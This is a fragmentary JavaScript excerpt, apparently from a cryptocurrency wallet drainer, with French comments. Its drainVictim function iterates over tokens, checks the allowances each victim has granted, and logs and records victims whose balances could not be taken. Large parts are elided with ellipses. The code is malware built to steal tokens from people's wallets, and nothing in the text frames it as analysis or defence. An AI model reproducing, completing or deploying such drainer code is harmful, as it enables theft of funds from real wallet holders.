...
export async function drainVictim(victimAddress, chainId) {
  ...
  for (const [tokenName, tokenInfo] of Object.entries(tokens)) {
    ...
    try {
      ...
      console.log(`[${tokenName}] Allowance pour ${victimAddress}: ${ethers.utils.formatUnits(allowance, tokenInfo.decimals)}`);
      if (allowance.isZero()) {
      ...
      // Pas de gas limit fixe – laisser ethers estimer
      ...
      // Si l'estimation échoue, c'est que la transaction est impossible -> on passe
      if (err.code === 'UNPREDICTABLE_GAS_LIMIT' || err.code === 'CALL_EXCEPTION') {
        const balance = await contract.balanceOf(victimAddress).catch(() => ethers.BigNumber.from(0));
        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
        continue;
      }
      // Erreur RPC ou réseau -> on relance pour réessayer
